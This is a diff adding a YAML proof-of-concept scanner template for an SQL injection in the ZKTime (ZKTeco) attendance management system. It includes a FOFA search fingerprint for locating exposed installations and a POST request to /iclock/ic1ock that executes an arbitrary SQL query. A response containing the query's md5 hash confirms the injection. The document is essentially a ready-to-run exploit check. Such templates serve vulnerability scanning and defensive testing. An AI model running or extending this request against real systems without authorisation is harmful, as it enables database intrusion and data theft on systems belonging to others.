@@ -1,0 +1,20 @@
+id: poc-yaml-zktecosz-ebiams-iclock-sqli
+info:
+  name: ZKTime熵基智能考勤管理系统 ic1ock SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 熵基智能考勤管理系统
+  fofa: body="/media/images/ZKECO16.ico"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /iclock/ic1ock
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: submit=%E6%89%A7%E8%A1%8C+SQL+%E8%AF%AD%E5%8F%A5&sql=select md5({{.t1}})
+  expression: status_code == 200 && contains(body,"执行 SQL 语句") && contains(body,"执行
+    select md5") && contains(body,"成功") && contains(body,t2)
+transport: http
